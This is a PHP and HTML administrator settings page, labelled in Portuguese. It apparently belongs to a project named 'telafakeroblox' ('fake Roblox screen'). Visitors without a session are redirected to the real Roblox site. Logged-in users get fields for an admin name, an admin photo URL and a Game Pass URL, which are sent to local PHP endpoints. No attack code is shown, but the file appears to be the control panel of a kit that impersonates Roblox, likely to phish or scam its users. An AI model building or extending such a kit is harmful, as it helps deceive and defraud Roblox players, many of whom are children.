<?php
session_start();
if (!isset($_SESSION['username'])) {
    header('Location: https://www.roblox.com/pt/home');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #121212;
            color: rgb(8, 245, 40);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .action-buttons {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .action-buttons a {
            background-color: red;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>
<h1 style="color:rgb(8, 245, 40); text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); text-align: center;">
    CONFIGURAÇÕES
</h1>

<!-- Campo para URL do Game Pass -->
<div class="form-group">
    <label for="gamePassUrl">URL do Game Pass</label>
    <input 
        type="text" 
        id="gamePassUrl" 
        name="gamePassUrl" 
        placeholder="Cole a URL do Game Pass aqui"
        oninput="handleGamePassUrl(this.value)"
    >
</div>

<!-- Formulário -->
<form id="configForm">
    <div class="form-group">
        <label for="adminNome">Nome do Administrador</label>
        <input type="text" id="adminNome" name="adminNome" placeholder="Digite o nome do administrador">
    </div>
    <div class="form-group">
        <label for="adminFoto">Foto do Administrador</label>
        <input type="text" id="adminFoto" name="adminFoto" placeholder="URL da foto do administrador">
    </div>
</form>

<div class="action-buttons">
    <button onclick="saveConfig()">Salvar Alterações</button>
    <a href="logout.php">SAIR</a>
</div>

<script>
    async function saveConfig() {
        const form = document.getElementById('configForm');
        const formData = new FormData(form);
        const config = {};
        formData.forEach((value, key) => config[key] = value);

        try {
            const response = await fetch('save_config.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config),
            });

            const text = await response.text();

            if (response.ok) {
                alert(text || 'Configuração salva com sucesso!');
            } else {
                throw new Error(text || `Erro HTTP: ${response.status}`);
            }
        } catch (error) {
            console.error('Erro ao salvar configuração:', error);
            alert('Erro ao salvar configuração: ' + error.message);
        }
    }
    
    async function handleGamePassUrl(url) {
        if (url.trim() !== '') {
            const apiUrl = `http://localhost/telafakeroblox/api.php?get=${encodeURIComponent(url)}`;

            try {
                const response = await fetch(apiUrl, { method: 'GET' });
                const text = await response.text();

                if (response.ok) {
                    alert(text || 'Requisição realizada com sucesso!');
                } else {
                    throw new Error(text || `Erro HTTP: ${response.status}`);
                }
            } catch (error) {
                console.error('Erro ao acessar a API:', error);
                alert(`Erro ao acessar a API: ${error.message}`);
            }
        } else {
            alert('O campo de URL não pode estar vazio.');
        }
    }
</script>
</body>
</html>
